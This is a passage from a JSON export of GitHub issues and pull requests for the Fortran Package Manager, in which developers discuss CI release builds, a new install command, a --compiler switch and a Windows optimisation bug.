            "text": "Fixes the CI so that it also tests the release build\n\nArguments to the CI scripts are passed on to fpm build, fpm run and fpm test to parameterize the test scripts\n\n\nFixes #254: workaround for compiler bug in Windows release build\n\nUpdate M_CLI2 revision to include upstream fix (urbanjost/M_CLI2#4)\n\n\n\nSee here for a successful workflow with the updated CI. (See here for the same workflow run prior to applying the Windows fixes.)\nSince this PR affects our CI checks and our release binaries, I think it should be prioritised over the several existing PRs, and I would be grateful for reviews.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-12-01 13:13:02+00:00",
                    "text": "Many thanks for the quick reviews all. I'll merge later today with a new release if there are no more comments."
                }
            ]
        },
        {
            "number": 259,
            "user": "awvwgk",
            "date": "2020-11-29 18:09:00+00:00",
            "title": "Reorder README to focus on the Fortran fpm version",
            "text": "A suggestion to reorder the README to set the focus on fpm itself.\nThe bootstrapping process is described in a collapsed details section.\nRelated #253",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-11-30 17:58:19+00:00",
                    "text": "Introducing the install.sh script significantly reduces the bootstrap instructions, I think we don't have to collapse them anymore because they also serve as reference to compile Fortran fpm with itself."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-12-01 01:20:53+00:00",
                    "text": "Thank you!"
                }
            ]
        },
        {
            "number": 258,
            "user": "awvwgk",
            "date": "2020-11-29 14:06:36+00:00",
            "title": "Platform specific testing",
            "text": "I'm kinda run into this issue when creating unit tests for the fpm-install command. We make a lot of implicit assumptions on the OS which does not allow to test both variants on the same build machine. It would be helpful for unit testing (and caching) to give all filesystem operations an optional input to set the build machine OS. Testing this kind of stuff on the CI is not great.\nAlso this allows to cache the OS identifier minimizes the calls to get_os_type.\nThe alternative would be to always abstract all OS specific testing in a separate library, but this just shifts the problem away to another project.",
            "comments": []
        },
        {
            "number": 257,
            "user": "awvwgk",
            "date": "2020-11-29 10:27:46+00:00",
            "title": "Implement fpm-install command",
            "text": "Noticed I require some working install command, when working on the fpm-dist command. Therefore, I coded up an installer type and implemented the fpm-install command.\n\n allow installing of executables\n optionally install library and modules if specified in manifest\n add install table to manifest reference\n use in CI to install fpm\n add unit tests for new manifest entry\n add unit tests for new installer type\n\nRelated #71\nCommand-line interface:\nNAME\n fpm-install(1) - install fpm projects\n\nSYNOPSIS\n fpm install [--release] [--no-rebuild] [--prefix DIR]\n             [--bindir DIR] [--libdir DIR] [--includedir DIR]\n             [--verbose]\n\nDESCRIPTION\n Subcommand to install fpm projects.\n\nOPTIONS\n --release         selects the optimized build instead of the debug build\n --no-rebuild      do not rebuild project before installation\n --prefix DIR      path to installation directory (requires write access)\n --bindir DIR      subdirectory to place executables in\n --libdir DIR      subdirectory to place libraries and archives in\n --includedir DIR  subdirectory to place headers and module files in\n --verbose         print more information\n\nInstallation configuration:\n[install]\n# whether or not to install library + modules (default: false)\nlibrary = false",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2020-11-30 17:21:10+00:00",
                    "text": "In the help text I like the new word \"archies\"  but I think \"archives\" is probably better  (It's old meaning for the ackkk-ackkk sound of anti-aircraft gunnery is pretty much obsolete, so I think it might catch on though) :>"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-01 03:31:17+00:00",
                    "text": "It would be useful long-term to be able to set access permits, ownership and group but given there is not a platform-independent way to do that with pure Fortran it is problematic, although easy to do on POSIX platforms.\nDo you intend it to be able to create the specified directories if needed or must all target directories pre-exisit?"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-01 03:35:50+00:00",
                    "text": "Should the default be to not rebuild and  a  --build switch be available instead of the opposite? I think that would be a more expected behavior. Althought the risk is low I would like to install an executable I have run tests on first, typically."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-01 06:19:17+00:00",
                    "text": "The help_install should be added to the list of help produced when you ask for the entire manual, and the install subcommand should be added to the list of available subcommands in several places so it shows in the output for list and the list of commands in the fpm_help. So the output from  fpm --list|fpm list fpm --help|fpm help  and fpm help manual should mention the install command, not just help install. I like the function you added so the strings can be unallocated, but when I called sget() directly like lget() to set the types describing the command types I hit a gfortran bug when I built with optimization where I got segfaults.  I have not pulled and built this yet, just looked over the code but might want to try that. That is why I set variables and passed those for the most part when I used sget() (in a few places I was actually testing the string several times and preferred to do that anyway)."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-01 07:15:57+00:00",
                    "text": "It would be useful long-term to be able to set access permits, ownership and group but given there is not a platform-independent way to do that with pure Fortran it is problematic, although easy to do on POSIX platforms.\n\nI haven't added file permissions yet, because I wasn't sure how to do it on non-POSIX platforms.\n\nDo you intend it to be able to create the specified directories if needed or must all target directories pre-exisit?\n\nActually, missing directories are automatically created.\n\nShould the default be to not rebuild and a --build switch be available instead of the opposite? I think that would be a more expected behavior. Althought the risk is low I would like to install an executable I have run tests on first, typically.\n\nThe CMake install behaviour is exactly this, you have to invoke a separate CMake command to actually build before installing, which I find annoying. In meson install you get automatically a rebuild if required, with an incremental rebuild like in #248 we can always rebuild without much additional cost.\nI'm mainly orienting my strategy on the meson commands because it is in fact my main build system and I think it is well thought out.\n\nThe help_install should be added to the list of help produced when you ask for the entire manual\n\nWill add it there."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-01 17:15:40+00:00",
                    "text": "I want to see install implemented and this is great; in the mean time I have been using the GNU/Linux install(1) command and the --runner option; but would prefer it integrated as you are doing here.  Personally I use platforms with POSIX interfaces  (on MSWindows either Cygwin or the Linux subshell) and permissions are relatively straight forward there. Users can verify the permits outside of fpm(1) but other than adding platform-specific commands or having conditional builds it is vexing.  I am not sure if stdlib is near releasing system features like this.  Should we be building a POSIX look-alike for each routine as we need it for now ( a topic for discussion outside of here, I suppose)?  There are a lot of things like CHMOD and CHDIR functionality that would make fpm so much nicer.  I actually use a shell wrapper with fpm that finds and moves to a directory with the fpm.toml file before executing because I find that so irritating that I have to move to that directory first; which would be trivially resolved with a CHDIR; but I digress.  Looks good but long-term it is likely permissions will be issue; but perhaps for now letting the user handle that is more reasonable than a kludge?  Since you are doing a system-dependent copy command though; perhaps adding a chmod after the copy is good for now?  I always prefer execute-only for everyone other than the owner for a binary executable myself.  I was comparing this to the command install(1) (which has its detractors by the way) and it defaults to backing up existing executables. Personally I do not need that, but install(1) has been around a long time so I thought I would mention it. The cp(1) and chmod(1) are essentially guaranteed on any GNU or Unix platform, I do not think install(1) itself is common enough to use it instead of cp(1) directly(?)."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-12-03 17:28:20+00:00",
                    "text": "At first glance I like it and I've been wanting something like it for a while now. A couple requests/suggestions though.\n\nI would prefer the default prefix be $HOME/.local. Many package managers are starting to default to this, and I like that it doesn't require sudo or administrative privileges.\nI would like a way to specify that only executable(s) be installed, and a way to specify only a specific executable. I.e. --target my_executable in symmetry with run and test."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-04 09:31:11+00:00",
                    "text": "I would prefer the default prefix be $HOME/.local. Many package managers are starting to default to this, and I like that it doesn't require sudo or administrative privileges.\n\nSounds good, what is the preferred prefix for Windows? I usually don't use the default prefix and always set my own to cope with the various software from different sources on my machines.\n\nI would like a way to specify that only executable(s) be installed, and a way to specify only a specific executable. I.e. --target my_executable in symmetry with run and test.\n\nNot sure about this, my expectation on the install command is to get complete project exported to another prefix. What is included in the installation should be the decision of the project maintainer rather than the user or packager. It is hard to tell as user or packager which parts of a project can be installed independently. If a project provides executables that can be installed independently, we should rather encourage splitting the project."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-12-04 13:59:36+00:00",
                    "text": "my expectation on the install command is to get complete project exported to another prefix\n\nIf you start installing libraries from different projects, you start to reintroduce the problem sandboxing them into the project for building solved in the first place. Right now we are statically linking (at least the Haskell version is). I know it's \"inefficient\" because you might end up with executables with the same copy of some library, but I think it's far more common that you'll have executables that need different versions of some library. At least that's the experience other languages have had.\nWith fpm, I no longer need to install libraries or worry about coming up with some common version that satisfies my needs for every project I'm working on. Given that, I don't know why I would ever install a library. I understand that for some people old habits die hard, and there are use cases where you would want to install a library, so I'm fine with having a way to do it, but I want a way not to do it."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-04 14:21:53+00:00",
                    "text": "Maybe we are talking about a different problems here.\n\nIf you start installing libraries from different projects, you start to reintroduce the problem sandboxing them into the project for building solved in the first place. Right now we are statically linking (at least the Haskell version is). I know it's \"inefficient\" because you might end up with executables with the same copy of some library, but I think it's far more common that you'll have executables that need different versions of some library. At least that's the experience other languages have had.\n\nI don't disagree with this point, for executables this works completely fine. As somebody packaging I would like to see a way to opt-out of the static linking, of course \ud83d\ude09. I see the conflict here and don't want to impose this on fpm, because it is out of scope for the project, however I will try to implement a solution with fpm-dist which suits the needs for packaging instead.\n\nWith fpm, I no longer need to install libraries or worry about coming up with some common version that satisfies my needs for every project I'm working on. Given that, I don't know why I would ever install a library. I understand that for some people old habits die hard, and there are use cases where you would want to install a library, so I'm fine with having a way to do it, but I want a way not to do it.\n\nBut for this point I disagree. There are several scenarios were I want to install a library. Use cases are\n\nlibrary-only projects, which do not provide executables by themselves (limited due to ABI issues)\nexporting non-module Fortran APIs or C APIs\ndynamically loading symbols from a shared library, e.g. interfacing a C API from Python\n\nSince this cases are the exception, a project has to opt-in on installing the library. Projects that want to install a library usually will do this for a good reason."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-07 09:31:35+00:00",
                    "text": "It seems like the default behaviour (of only installing executables) addresses your concern @everythingfunctional \u2014 are you happy for this PR move forward?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-08 12:19:48+00:00",
                    "text": "I have to rebase this branch and incorporate the --compiler flag here as well first."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-10 17:49:51+00:00",
                    "text": "Thanks for you patience on this PR. I rebased against the latest changes to allow checking how the fpm-install command works together with the example programs and the new fpm-update feature.\nTo address the comments above, by default all executables from the projects are installed, examples and tests are not considered for installation. If a project opts-in to installing a library, the archive and the module files are installed as well."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-13 12:47:39+00:00",
                    "text": "The only not addressed issue in the PR are the file permissions on POSIX systems together with the install(1) command. Since this PR is meant to create the foundation to implement any kind of installer, I would like to explore file permissions with a separate PR as this one is already quite large.\nUnless there is anything blocking this PR I will merge within the next week."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-12-13 16:45:25+00:00",
                    "text": "Thank you for this implementation. I just played with it now and it works. I have three suggestions:\n\nMake library = true under [install] in the manifest as the default. I don't have a good rationale for this other than that I expect packages to be installable by default. What do others think? Sorry if there has already been a discussion on this--I didn't see it.\nIf a package is not installable, i.e. if library = false is set in the manifest, then fpm install should emit some helpful message, for example:\nfpm-install as the name in the help message is a tad confusing because there's no such executable as fpm-install. Perhaps a man page is not a suitable format for these CLI help messages. But I'm not convinced either way.\n\nNothing to install ([install] library is set to false in fpm.toml)\n\nor something similar. Currently fpm install doesn't emit any output which usually implies non-verbose success."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-13 17:12:38+00:00",
                    "text": "Thanks for the comments, I included a check if the project is actually installable.\n\n\nMake library = true under [install] in the manifest as the default. I don't have a good rationale for this other than that I expect packages to be installable by default. What do others think? Sorry if there has already been a discussion on this--I didn't see it.\n\n\nThe preference seems to be an executable-only focus for now, to allow library projects the opt-in install.library is a good compromise in my opinion. We can revisit this once we flesh out the installer command in further PRs.\n\n\nfpm-install as the name in the help message is a tad confusing because there's no such executable as fpm-install. Perhaps a man page is not a suitable format for these CLI help messages. But I'm not convinced either way.\n\n\nSince our help pages are currently catman pages, I try to follow the conventions for man pages here. It seems to be a convention for man pages of subcommands like git add to be stored as git-add(1). Usually the command man git add is identical to man git-add, possibly to avoid whitespace in filenames. Using install(1) as name is not possible, because there is actually a program install(1) available on most Unix systems. That's my reason for choosing fpm-install(1)."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-13 18:59:11+00:00",
                    "text": "Name conficts with man pages were designed for their suffix to be a category, as there are often conflicts. Think of test, for example.\nThe other packages seem to be taking a short-cut.  If the manpages are named  topic.1fpm.gz instead of fpm-topic.1.gz  then entering\nman 1fpm topic \nman topic.1fpm\n\nwill go directly to it.  And you can list all the related man pages .  So if all the man pages have the fpm suffix  you can find them.\nThere are lots of other syntaxes that work too, as man(1) has a long history.  Maybe because people did not like using the number\npeople started adding one-line manpages named fpm-topic.1.gz that  where just an \".so\" of the topic.1fpm files. Now it looks like several packages just put subcommands in fpm-topic.1.gz files directly as you noted.\nIn the past the solution  was often to add a subcommand to your program like man  that would do something like set MANSECT to fpm and call the man(1) command  or copy flat versions of the man pages (usually generated by man topic|col -b` if the man command was not available.   So man(1) has lots of ways to handle duplicate names (which there are many of) but they are not commonly known and it looks like the program-subcommand syntax is used by at least git and cargo (on my machine those where the ony ones with actual man pages  named program-topic).\nSo there other ways; and perhaps  just  using topic.1fpm.gz files and adding a \"man\" subcommand or making fpm help topic smarter and if a whereis  1fpm topic returns a pathname it assumes man(1) is on the system and displays the help with man,\nelse displays flat text.  My impression is there are a good number of people interested in using fpm on non-open systems like MSWindows where man(1) is not available.\nAnyway, since I think those questions are unanswered that just writing it up as \"install\" is less confusing;  albeit the git and cargo\nexamples show this has become a popular solution that requires less intimacy with the man(1) command.  But if we are sure that\nthe documentation will be deployed with man(1) where available (I am good with that) I think we need consistency; so all pages should described themselves with a command name or all should use fpm-topic.  Mixing them is confusing.\nSo, for example, if I enter\ngit help rebase\nIt actually calls man(1).  Not sure how many users do the man of the git commands directly versus git help ... . Not sure what git does no platforms without man(1).  But unless we expect the man pages to be used directly a lot outside of fpm we do not have to use the fpm-topic format. Note when I use the git help I put in the topic \"rebase\" not \"git-rebase\".\nAnyway, I think we should expect that the main way to get on-line help will be \"fpm help topic\". Whether that calls man for formatting or a web browser or displays flat text or info files is then hidden from a new user. If that is true, there is no technical reason to follow the git(1) or cargo(1) convention other than how we want someone to see the pages when using man(1) directly."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-13 19:16:20+00:00",
                    "text": "looking around, there seem to be about eight approaches. Note that openssl does both but using links instead of \".so\" files:\n8 -rw-r--r--. 1 root root 5126 Mar  5  2020 genpkey.1ssl.gz\n0 lrwxrwxrwx. 1 root root   15 Mar  5  2020 openssl-genpkey.1ssl.gz -> genpkey.1ssl.gz\n\nSo they make a  topic.1ssl.gz file and then link openssl-genpkey.1ssl.gz to it so\nman openssl-genpkey\nman 1ssl genpkey\nman genpkey.1ssl\nman -a genpkey\n\nall work"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-13 19:29:09+00:00",
                    "text": "@urbanjost Thanks for the explanation, my knowledge about man is limited to the content of man man and related documents. While I found the general concept of man page topics helpful and started to use it initially quite extensively in my documentation, I got quickly tired of having to explain man pages and man topics to my co-developers and users and therefore eventually dropped it again. I still see the beauty in man topics, but it seemed like a lost fight to force it upon people."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-14 17:08:13+00:00",
                    "text": "A user developing a library or module  (ie. does not even have an app/ directory) that they want installed for usage outside of fpm\nin a conventional mode would have to know too much about fpm and TOML and the options allowed in fpm manifest files\n   Libraries and module files are only installed for projects requiring the\n   installation of those components in the package manifest.\n\nTo know they have to edit their fpm.toml file and add\n[install]\nlibrary=true\nso I agree with @milancurcic  that either the behavior or help text needs to change. The original fpm only created a src/ directory.\nI think a library install should be trigged if you specify the  --libdir OR --includedir switch regardless of the setting.  As it is if I do\n   f pm new A --src\n   # change A/src/A.f90 till it does what I want\n   fpm install --libdir [anything]\n\ninstall will do nothing and produce no message, which is very unintuitive.  At a minimum the help text could say something like\nDESCRIPTION\n Subcommand to install fpm projects. This command can install components\n of the project into external directories. It will install nothing but\n executables no matter what options are supplied unless the \"fpm.toml\" \n manifest file includes the equivalent of the entries\n\n    [include]\n    library = true\n\n By default it will install all executables (tests and examples\n are excluded).  If \"library=true\" it will also install all libraries and\n module files which are part of the project (not files from dependencies).\n\nAfter trying it with more complex projects  I would like it to\n\nuse the --list switch (to be most consistent with the other commands)\nor something like --dryrun  to show what it would do without doing it\nallow for a list of executable names to install  (which I think others mentioned)\n\nAlthough theoretically if all your components were in fpm installing libraries and modules would not be needed,\nbut initially I suspect the opposite is one of the bigger user cases.  Use fpm to create a library and export it for conventional use.\nExternal files are going to be around for a while. Users will want to make not just applications but libraries available to non-fpm users;  and people will develop dynamic libraries that need to be in user load paths."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-14 17:42:04+00:00",
                    "text": "It looks like there is some mixed opinion on the installation of libraries.\nI disagree that most users will want to install their library system-wide and I do not believe that we should be encouraging users to do so. Unlike the c programming language, Fortran does not have a standard ABI and hence it does not make sense for users to install their libraries system wide since the compiled library is specific to the compiler vendor and version. Moreover, there is no agreed-upon standard for where to store the necessary module files, which are similarly binary incompatible between compilers and compiler versions.\nAs @awvwgk pointed out, there are valid exceptions to this \u2013 primarily exporting non-module (legacy) Fortran or c APIs \u2013 however most users should be using Fortran modules and, in the case of third-party build scripts, should be encouraged to be compatible as an fpm dependency by placing outputs in the correct location.\nAs such I believe the behaviour currently implemented in this PR (only executables are installed by default) is strongly preferred."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-12-14 18:30:00+00:00",
                    "text": "I'm with @LKedward on this one. There are too many issues associated with installing libraries and so we don't really want to encourage users to do it, so it shouldn't be the default. Not the least of which is that if it doesn't install the dependencies too, then the installed library still isn't usable. I think (maybe hope) that this will very quickly become the vast majority of libraries that have this problem. I think it's fine to have a way to install them, because there are times you really want to do it, but it shouldn't be the default.\nOther than that, I'm all good for this to go forward."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-12-14 18:32:47+00:00",
                    "text": "With all the good arguments, I now agree that not installing the library is a saner default."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-14 18:38:57+00:00",
                    "text": "@urbanjost I added the --list functionality to the install command to show the installable targets in a project. Also the install command will now produce an error if there are no installable targets available. The install.library has been documented in the manifest reference as well.\nThe installation of libraries is a tricky thing, we currently have no resolution of the dependencies at all, but only one library target in the fpm_model_t available. This means the installed library will contain the root project and parts of the dependencies as well. To have a meaningful way to install and export library targets for external use or other build systems more work has to be done, like writing a pkg-config file or creating a CMake package file."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-14 21:10:13+00:00",
                    "text": "I also do not want installing libraries to be the default  unless I specify the --libdir and/or --libinclude pathnames;  but the options exist\nfor libraries and include files so I think the documentation should be very clear they are no-ops and specically describe these kind of limiitations and how to override them, or the options should be removed. I have not tried the changes yet but just having a message should help a lot."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-14 23:44:14+00:00",
                    "text": "I also do not want installing libraries to be the default unless I specify the --libdir and/or --libinclude pathnames; but the options exist\nfor libraries and include files so I think the documentation should be very clear they are no-ops and specically describe these kind of limiitations and how to override them, or the options should be removed. I have not tried the changes yet but just having a message should help a lot.\n\nThanks for the clarification, I considered --libdir, --includedir and --bindir no-ops by convention. At least this is the behaviour I observe across the different build tools I use. I can clarify this in the help page as well."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-18 08:44:02+00:00",
                    "text": "Thanks everyone for the review and discussions. I'll go ahead and merge later today."
                }
            ]
        },
        {
            "number": 256,
            "user": "awvwgk",
            "date": "2020-11-28 10:42:08+00:00",
            "title": "Use git plumbing rather than git porcelain commands",
            "text": "Working with the current our current git interface I noticed that we are using the porcelain (high-level) interface for git rather than its plumbing (low-level) interface. I think it is worth to switch from the porcelain to the plumbing interface, since the latter is more predictable and less verbose.\nFor example getting the root commit, with the porcelain command git log -n 1 HEAD results in\ncommit 105644ca8bce711b407e1a15f8f456693f60ff43\nMerge: 2612d9a 846d4e5\nAuthor: Laurence Kedward <laurence.kedward@bristol.ac.uk>\nDate:   Wed Nov 25 16:00:58 2020 +0000\n\n    Merge pull request #246 from LKedward/release_builds\n    \n    CI: upload binaries when a release is published\n\nReading the commit requires to tokenize the first line of the output and the porcelain command output changes depending on the output device.\nUsing the plumbing command git show-ref HEAD --hash instead gives the hash directly:\n105644ca8bce711b407e1a15f8f456693f60ff43\n\nSince we are planning to use libgit2 (see #168) at some point where we would have access to an API of the plumbing commands rather than the porcelain ones, we should adjust this anyway to make this transition as seamless as possible. Unfortunately, the plumbing commands do not support the handy -C directory switching which will make working with them a little more complicated.\nCurrently we use the following three porcelain commands:\n\ngit init\ngit fetch\ngit checkout\n\nJust opening this issue to keep track of it. In case anyone has experience with plumbing command alternatives for the above let me know.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-28 14:55:28+00:00",
                    "text": "Good idea. \ud83d\udc4d  from me."
                }
            ]
        },
        {
            "number": 255,
            "user": "urbanjost",
            "date": "2020-11-27 13:35:25+00:00",
            "title": "Add --compiler switch",
            "text": "added  new switch called --compiler that sets the Fortran compiler name.\n\nThe default compiler name to use is taken from the value of the\nenvironment variable FPM_COMPILER\nIf it is not set the name gfortran is used. as the default\nThe value specified on the command line overrides any default.\n\n--target\nThe list of executables to run with the run and test subcommands\ncan now be prefixed with --target, as with the Haskell version of\nfpm(1).\nSUMMARY\nSo default usage is unchanged from the previous version. By simply setting\nFPM_COMPILER you can use it like the previous version with other compilers for\ndefault debug and release builds.\n  wget http://www.urbanjost.altervista.org/REMOVE/ffpm.f90\n\n  gfortran ffpm.f90 -o $HOME/.local/bin/ffpm\n\n    # get a test package or use your own\n    if [ ! -d M_CLI2 ]\n    then\n       git clone https://github.com/urbanjost/M_CLI2\n    fi\n    cd M_CLI2\n\n    # default build using ifort\n    ffpm build --compiler ifort\n    export FPM_COMPILER=ifort\n    ffpm run\n    ffpm test",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2020-11-28 01:58:27+00:00",
                    "text": "After trying it for seveal days while trying to load in as many packages as I could find FC being used, I find it is used heavily, but inconsitently. CMake uses it in an interesting way where the name can be followed by compiler options that are used to set the options for a build, which might be an approach to adapt for custom builds not specified via a config file/TOML file setting.  Make of course uses it, and is probably where the \"standard\" use of FC orginated.  Several environment modules such as one for nvfortran use it with a full pathname to the executable. This version handles this by using the basename of the first word of FC; but since the usage is common but varies in meaning significantly I think FPM_FC is needed. If not, as in this implementation, as an override of FC then the cleanest single-option solution seems to be FPM_FC and --fc or FPM_COMPILER and --compiler. Possibly a short name for --compiler would also be desireable. Since the name --fc implies some association with the FC environment variable that is not strictly true in the first scenario, I think it comes down to the second choice. Another factor in favor of that is that --compiler is more compatible with h-fpm.  So, although not my personal first choice. I think that it will be\n--compiler COMPILER_NAME\nwhere the default compiler name is taken from the environment variable FPM_COMPILER if set, else 'gfortran' is used. I still find the use of an environment variable for establishing a default useful so I do not propose dropping that. Any dissents or alternatives?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-11-28 02:06:25+00:00",
                    "text": "the cleanest single-option solution seems to be FPM_FC and --fc or FPM_COMPILER and --compiler. Possibly a short name for --compiler would also be desireable. Since the name --fc implies some association with the FC environment variable that is not strictly true in the first scenario, I think it comes down to the second choice. Another factor in favor of that is that --compiler is more compatible with h-fpm. So, although not my personal first choice. I think that it will be\n--compiler COMPILER_NAME\nwhere the default compiler name is taken from the environment variable FPM_COMPILER if set, else 'gfortran' is used.\n\nHaving thought some more and read your message, I agree and now prefer FPM_COMPILER for the env var and --compiler for the flag."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-28 09:33:47+00:00",
                    "text": "CMake uses it in an interesting way where the name can be followed by compiler options that are used to set the options for a build\n\nCMake also supports reading compile flags from FFLAGS.\n\nSeveral environment modules such as one for nvfortran use it with a full pathname to the executable\n\nIn case of conda-build the FC variable is usually set to something like $BUILD_PREFIX/bin/aarch64-conda-linux-gnu-gfortran, which is still gfortran, but has a lot of additional information in the variable name.\n\nhis version handles this by using the basename of the first word of FC; but since the usage is common but varies in meaning significantly I think FPM_FC is needed\n\nUsing the basename of the compiler found in FC could result in using the wrong compiler. Imagine having two versions of gfortran in your path and you select the latter by giving its explicit path. In this case the basename would be gfortran and the compiler found first in the path would be used instead. Most build systems support both absolute paths to the binary and a name that can be found in the PATH variable."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-28 14:46:13+00:00",
                    "text": "I agree with @milancurcic that they should be FPM_COMPILER and --compiler."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-30 00:52:12+00:00",
                    "text": "PS: Working on a test of the help subcommand but really haven't thought of a satisfying way to say it is good other than size, line count, and a check for a few words.  Used the COUNT() intrinsic to count letter frequency which was intereresting but I decided to drop it (but \"fpm help manual\" produced the expected result with ETA being the three most common letters). Any thoughts on a Fortran-only test of the help output? I am trying to avoid using external system commands."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-02 04:22:45+00:00",
                    "text": "I think the latest push resolves the immediate concerns and sets up for a later reconfig of the compiler options in an OOP structure as a possible later change, but segregates this all into fpm_compiler.f90 for now. So does anyone see any remaining issues?"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-06 01:21:16+00:00",
                    "text": "Since ithe conditional compilation PR was  closed I wondered if you saw that note on the code still checking whether to build if the executable exists for run and test? Now that conditional compilation is implemented do you want that removed?\n\nI added a note to the PR or issue (do not remember) but I think it was actually closed so not sure if you saw that or not."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-06 19:18:32+00:00",
                    "text": "PS:  having a -I module_build_directory would make #252 just require writing the TOML data and maybe a build date or even a git commit number in fortran format and sticking it in there with some name like fpm_build.inc.  So that paves the way for that if/when it goes forward."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-07 02:05:58+00:00",
                    "text": "Wondering about these additional NAG switches. Proposing\nRELEASE -unsharedrts\nBOTH -dusty -mismatch_all -dcfuns # loosens up NAG strictness\nBOTH -openmp\nDEBUG -nan\n\nif there is time. Several imply the loosen up the strictness of the NAG compiler. Untried, but they sound useful. Running some of the code thru their polish interface might resolve some of the style differences that have come up for discussion. At least on screen it sounds interesting. If anyone has time to try to get a measure of how many more projects compile with those \"looser\" options that would be interesting.  Glad to hear M_CLI2 compiled up."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-07 10:58:19+00:00",
                    "text": "Many thanks @urbanjost and thanks everyone for reviewing. With three approvals I will now merge.\n\nRegarding the additionally proposed flags for NAG, I suggest leaving them out for now since they do not match any flags requested of the other compilers. (-nan/-finit-real=snan is perhaps a good one to add for the debug builds)"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-12-07 15:47:08+00:00",
                    "text": "Wondering about these additional NAG switches. Proposing\nRELEASE -unsharedrts\nBOTH -dusty -mismatch_all -dcfuns # loosens up NAG strictness\nBOTH -openmp\nDEBUG -nan\n\nif there is time. Several imply the loosen up the strictness of the NAG compiler. Untried, but they sound useful. Running some of the code thru their polish interface might resolve some of the style differences that have come up for discussion. At least on screen it sounds interesting. If anyone has time to try to get a measure of how many more projects compile with those \"looser\" options that would be interesting. Glad to hear M_CLI2 compiled up.\n\nI would suggest not adding flags for NAG that reduce strictness. I know that much of NAG's draw (at least for me and some others I know) is that it catches so many more potential issues by default. Adding support for a strict compiler and then removing that strictness by default seems like conflicting intent."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-07 15:49:57+00:00",
                    "text": "@everythingfunctional I would suggest to move the discussion about the NAG compiler support to a separate issue to make it more discoverable, now that this PR is merged."
                }
            ]
        },
        {
            "number": 254,
            "user": "LKedward",
            "date": "2020-11-27 11:41:09+00:00",
            "title": "Command line bug on Windows",
            "text": "Running fpm --version (or fpm --help) on Windows using the latest release build (fpm-v0.1.0-windows-x86_64.exe) produces the following error:\nUNKNOWN LONG KEYWORD: --version\nKEYWORD  SHORT PRESENT VALUE\n               F        [F]\n\nNo such error occurs on Linux. I believe this regression was introduced in #239 where the M_CLI2 revision was updatded.\n@urbanjost, are you able to look into this?",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-11-27 12:11:55+00:00",
                    "text": "Okay I've tracked it down to the use of compiler optimisation.\nThe following will work and print help information: fpm run --flag -O0 -- --help, however any non-zero level of optimisation (-O1,-O2,-O3) will fail with the above error message.\n@urbanjost, it looks like the command line interface is possibly relying on some undefined behaviour which is causing issues when compiled with optimisation flags on Windows.\nedit: Tested on Windows 10 with mingw-w64-gcc 8.1.0 where fpm is being bootstrapped with the latest Haskell fpm implementation.\n\nWe should add tests on the release version in our CI."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-27 13:49:05+00:00",
                    "text": "Have not been able to reproduce it on Red Hat, so will need to install mingw on a MSWindows machine. Hopefully that will be straight\nforward."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-28 20:22:09+00:00",
                    "text": "Installed three versions of minogw and also tried in Cygwin, and Cygwin with mingw added and  just running the M_CLI2 tests themselves independent of ffpm (on ifort, nvfortran, and gfortran)\nand I cannot reproduce the problem just building the fortran part. I will try to set up the machine to have the Haskell setup instead of directly compiling the fortran parts.  It did not sound like the problem would require that to duplicate but I have been unable to duplicate it so far."
                },
                {
                    "user": "LKedward",
                    "date": "2020-11-28 22:59:21+00:00",
                    "text": "Have you tried the mingw-w64 8.1.0 build available here on plain Windows (same as used in our CI). I'm able to reproduce on a separate Windows machine with this mingw-w64 version using the latest master branch built from scratch.\nc:\\>gcc --version\ngcc (x86_64-win32-seh-rev0, Built by MinGW-W64 project) 8.1.0\n\nAfter building from scratch (delete output folder), with bootstrap fpm I get:\nc:\\msys64\\home\\laure\\git\\fpm3\\fpm>fpm run --release -- --version\nUNKNOWN LONG KEYWORD: --version\nKEYWORD  SHORT PRESENT VALUE\n               F        [F]\n\nAs per my previous comment this appears to be a problem that only occurs with compiler optimization flags hence '--release'."
                },
                {
                    "user": "LKedward",
                    "date": "2020-11-29 11:56:32+00:00",
